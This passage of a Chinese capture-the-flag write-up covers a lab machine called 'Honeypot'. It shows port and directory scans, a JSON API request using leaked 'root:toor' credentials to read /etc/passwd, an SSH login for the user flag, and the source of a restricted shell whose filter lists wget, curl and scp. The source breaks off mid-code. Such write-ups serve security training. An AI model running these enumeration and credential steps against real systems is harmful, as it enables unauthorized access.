class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.41                            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00046s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.10 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.41 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00079s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Honeypot - \xE7\xBD\x91\xE7\xBB\x9C\xE5\xAE\x89\xE5\x85\xA8\xE8\xAF\xB1\xE6\x8D\x95\xE7\xB3\xBB\xE7\xBB\x9F<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.79 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302216582.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.41 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.41<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 35557]<br>/.html                (Status: 403) [Size: 277]<br>/user.txt             (Status: 200) [Size: 184]<br>/history.txt          (Status: 200) [Size: 118]<br>/api                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.41/api/]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>发现目录<code>user.txt</code>，<code>history.txt</code>，<code>api</code></p><p>访问<code>user.txt</code>，是常见的Linux用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.41/user.txt <br>root<br>daemon<br>bin<br>sys<br><span class="hljs-built_in">sync</span><br>games<br>man<br>lp<br>mail<br>news<br>uucp<br>proxy<br>www-data<br>backup<br>list<br>irc<br>gnats<br>nobody<br>_apt<br>systemd-timesync<br>systemd-network<br>systemd-resolve<br>systemd-coredump<br>messagebus<br>sshd<br></code></pre></td></tr></table></figure><p>访问<code>history.txt</code>，提示一个<code>root:toor</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.41/history.txt<br>root:toor<br>[2025-06-29 03:29:21] IN: <span class="hljs-built_in">sudo</span> -l<br>[2025-06-29 03:29:21] IN: <span class="hljs-built_in">sudo</span> -l<br>OUT: -bash: <span class="hljs-built_in">sudo</span> -l: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><p>访问<code>api</code>，里面存在一个<code>manage.php</code>，尝试访问提示我们需要账号和密码，根据<code>history.txt</code>里面的提示，尝试进行登录，成功进入到页面，页面里面是一段json代码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302222944.png"></p><h2 id="2、JSON代码"><a href="#2、JSON代码" class="headerlink" title="2、JSON代码"></a>2、JSON代码</h2><p>额，丢到AI里面看看是什么意思</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">这段响应的核心含义是：客户端请求了一个系统不支持的操作（或参数不合法），导致错误；同时系统列出了所有可用的操作及其规则，帮助客户端调整请求以符合要求。常见错误原因可能是：<br>- 请求的 `action` 名称拼写错误或未在 `available_actions` 中定义；<br>- 操作需要的参数缺失或格式错误（如 `file_view` 的 `path` 不在允许目录内）。<br></code></pre></td></tr></table></figure><ul><li><code>process_list</code>：列出所有正在运行的进程，无参数</li><li><code>file_delete</code>：删除指定路径的文件（限制：路径必须在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下），必选参数 path（文件路径）</li><li><code>file_view</code>查看指定路径文件的内容（限制：路径必须在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下）必选参数 path（文件路径）</li><li><code>directory_list</code>：列出指定目录下的内容（文件&#x2F;子目录），必选参数 path（目录路径）</li><li><code>find_files</code>：在指定路径下按模式（如通配符）查找文件，必选参数 path（搜索路径）、pattern（匹配模式）</li><li><code>server_info</code>：获取服务器的基础信息（如版本、配置等），无参数</li><li><code>auth_stats</code>：获取认证相关的统计信息（如登录次数、失败尝试等），无参数</li><li><code>recent_logs</code>：获取最近的API活动日志（如请求时间、操作类型、用户等），无参数</li><li><code>sys_info</code>：获取系统综合信息（如CPU&#x2F;内存&#x2F;磁盘使用率、网络状态等），无参数</li></ul><p>那直接构造一个可以执行的json请求<br>添加JSON的类型和结构体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/manage.php HTTP/1.1<br>Host: 192.168.2.41<br>Cache-Control: max-age=0<br>Authorization: Basic cm9vdDp0b29y<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: <span class="hljs-string">&quot;application/json&quot;</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 81<br><br>&#123;<br>  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;file_view&quot;</span>,<br>  <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/passwd&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问<code>/etc/passwd</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302242775.png"></p><p>后面一直在尝试构造请求，去读取相关的文件，但除了几个特定的文件外均不可进行读取<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302245621.png"></p><p>后面看了群主的WP视频，发现可以直接使用<code>root:toor</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh root@192.168.2.41<br> _   _                                    _   <br>| | | | ___  _ __   ___ _   _ _ __   ___ | |_ <br>| |_| |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \ | | | &#x27;</span>_ \ / _ \| __|<br>|  _  | (_) | | | |  __/ |_| | |_) | (_) | |_ <br>|_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|<br>                        |___/|_|             <br>root@192.168.2.41<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">user@honeypot:/home/root# id</span><br><span class="hljs-string">uid=1001(xxxx) gid=1001(xxxx) groups=1001(xxxx)</span><br></code></pre></td></tr></table></figure><p><strong>USER FALG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/home/root# <span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-02a6dcfe-54a3-11f0-ae46-77faa154db7c&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code>，提示命令没有找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/home/root# <span class="hljs-built_in">sudo</span> -l<br>-bash: <span class="hljs-built_in">sudo</span> -l: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在<code>/opt/</code>目录下面找到一个<code>jail_v1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/opt# <span class="hljs-built_in">cat</span> jail_v1<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;time.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;fcntl.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br><span class="hljs-comment">#include &lt;dirent.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/utsname.h&gt;</span><br><span class="hljs-comment">#include &lt;pwd.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/wait.h&gt;</span><br><span class="hljs-comment">#include &lt;errno.h&gt;</span><br><br><span class="hljs-comment">#define LOG_PATH &quot;/var/www/html/history.txt&quot;</span><br><span class="hljs-comment">#define MAX_CMD_LEN 1024  // 修改宏名称避免冲突</span><br><span class="hljs-comment">#define MAX_OUTPUT 8192</span><br><span class="hljs-comment">#define MAX_PATH 256</span><br><br>FILE *logfile;<br>char current_dir[MAX_PATH] = <span class="hljs-string">&quot;&quot;</span>;<br><br>// 记录操作日志<br>void log_activity(const char *input, const char *output) &#123;<br>    <span class="hljs-keyword">if</span> (!logfile) <span class="hljs-built_in">return</span>;<br>    <br>    time_t now = <span class="hljs-keyword">time</span>(NULL);<br>    struct tm *t = localtime(&amp;now);<br>    fprintf(logfile, <span class="hljs-string">&quot;[%04d-%02d-%02d %02d:%02d:%02d] IN: %s\n&quot;</span>, <br>            t-&gt;tm_year + 1900, t-&gt;tm_mon + 1, t-&gt;tm_mday,<br>            t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec, input);<br>    <br>    <span class="hljs-keyword">if</span> (output &amp;&amp; strlen(output) &gt; 0) &#123;<br>        fprintf(logfile, <span class="hljs-string">&quot;OUT: %s\n\n&quot;</span>, output);<br>    &#125;<br>    fflush(logfile);<br>&#125;<br><br>// 检查命令是否被允许<br>int is_command_allowed(const char *<span class="hljs-built_in">command</span>) &#123;<br>    const char *allowed[] = &#123;<br>        <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <br>        <span class="hljs-string">&quot;ifconfig&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <br>        <span class="hljs-string">&quot;history&quot;</span>, <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;clear&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; allowed[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> (strcmp(<span class="hljs-built_in">command</span>, allowed[i]) == 0) &#123;<br>            <span class="hljs-built_in">return</span> 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// 检查命令是否试图修改文件系统<br>int is_file_modification_command(const char *<span class="hljs-built_in">command</span>) &#123;<br>    const char *modifiers[] = &#123;<br>        <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <br>        <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;nano&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;vim&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <br>        <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;zip&quot;</span>, <span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <br>        <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;git&quot;</span>, <span class="hljs-string">&quot;svn&quot;</span>, <span class="hljs-string">&quot;wget&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;scp&quot;</span>, <span class="hljs-string">&quot;rsync&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; modifiers[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> (strstr(<span class="hljs-built_in">command</span>, modifiers[i])) &#123;<br>            <span class="hljs-built_in">return</span> 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// 过滤输出中的xxxx敏感信息<br>void filter_xxxx_output(char *output) &#123;<br>    char *patterns[] = &#123;<br>        <span class="hljs-string">&quot;xxxx&quot;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxx&quot;</span>, <br>        <span class="hljs-string">&quot;/xxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; patterns[i]; i++) &#123;<br>        char *pos = output;<br>        <span class="hljs-keyword">while</span> ((pos = strstr(pos, patterns[i]))) &#123;<br>            memset(pos, <span class="hljs-string">&#x27;x&#x27;</span>, strlen(patterns[i]));<br>            pos += strlen(patterns[i]);<br>        &#125;<br>    &#125;<br>&#125;<br><br>// 执行命令并获取输出<br>void execute_command(const char *input, char *output) &#123;<br>    // 检查命令是否被允许<br>    char command_copy[MAX_CMD_LEN];<br>    strncpy(command_copy, input, MAX_CMD_LEN);<br>    char *first_token = strtok(command_copy, <span class="hljs-string">&quot; &quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!first_token || !is_command_allowed(first_token)) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;-bash: %s: command not found&quot;</span>, input);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    // 检查文件修改操作<br>    <span class="hljs-keyword">if</span> (is_file_modification_command(input)) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;-bash: %s: Permission denied&quot;</span>, input);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    // 创建管道<br>    int pipefd[2];<br>    <span class="hljs-keyword">if</span> (pipe(pipefd) == -1) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;pipe error: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    pid_t pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; 0) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;fork error: %s&quot;</span>, strerror(errno));<br>        close(pipefd[0]);<br>        close(pipefd[1]);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (pid == 0) &#123; // 子进程<br>        close(pipefd[0]); // 关闭读端<br>        <br>        // 重定向标准输出和错误输出到管道<br>        dup2(pipefd[1], STDOUT_FILENO);<br>        dup2(pipefd[1], STDERR_FILENO);<br>        close(pipefd[1]);<br>        <br>        // 解析命令参数<br>        char *args[64];<br>        int i = 0;<br>        <br>        char *token = strtok((char *)input, &quot; &quot;);<br>        while (token != NULL &amp;&amp; i &lt; <span class="hljs-number">63</span>) &#123;<br>            args[i++] = token;<br>            token = strtok(NULL, &quot; &quot;);<br>        &#125;<br>        args[i] = NULL;<br>        <br>        // 执行命令<br>        execvp(args[<span class="hljs-number">0</span>], args);<br>        <br>        // 如果execvp失败<br>        fprintf(stderr, &quot;execvp failed: %s&quot;, strerror(errno));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125; <span class="hljs-keyword">else</span> &#123; // 父进程<br>        close(pipefd[1]); // 关闭写端<br>        <br>        // 读取命令输出<br>        output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        char buffer[256];<br>        ssize_t count;<br>        <br>        <span class="hljs-keyword">while</span> ((count = read(pipefd[<span class="hljs-number">0</span>], buffer, sizeof(buffer) - <span class="hljs-number">1</span>)) &gt; 0) 